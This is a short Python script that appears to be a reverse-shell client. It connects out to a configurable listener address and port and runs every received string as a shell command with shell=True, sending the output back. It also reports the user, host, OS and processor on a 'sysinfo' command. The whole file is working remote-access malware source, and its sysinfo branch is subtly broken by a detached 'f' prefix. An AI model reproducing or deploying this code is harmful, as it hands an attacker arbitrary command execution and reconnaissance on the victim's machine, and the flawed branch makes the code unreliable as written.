import socket
import subprocess
import os
import platform
import getpass
import colorama
from colorama import Fore, Style
from time import sleep

colorama.init()

RHOST = "127.0.0.1"
RPORT = 2222

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((RHOST, RPORT))

while True:
    try:
        header = f"""{Fore.RED}{getpass.getuser()}@{platform.node()}{Style.RESET_ALL}:{Fore.LIGHTBLUE_EX}{os.getcwd()}{Style.RESET_ALL}$ """
        sock.send(header.encode())
        STDOUT, STDERR = None, None
        cmd = sock.recv(1024).decode("utf-8")

        # Get system info
        if cmd == "sysinfo":
            sysinfo = f
            """
                    Operating System: {platform.system()}
                    Computer Name: {platform.node()}
                    Username: {getpass.getuser()}
                    Release Version: {platform.release()}
                    Processor Architecture: {platform.processor()}
            """
            sock.send(sysinfo.encode())

        else:
            comm = subprocess.Popen(str(cmd), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            STDOUT, STDERR = comm.communicate()
            if not STDOUT:
                sock.send(STDERR)
            else:
                sock.send(STDOUT)

        if cmd == "terminate":
            print("connection dropped")
            break

    except Exception as e:
        sock.send("An error has occured: {}".format(str(e)).encode())

sock.close()
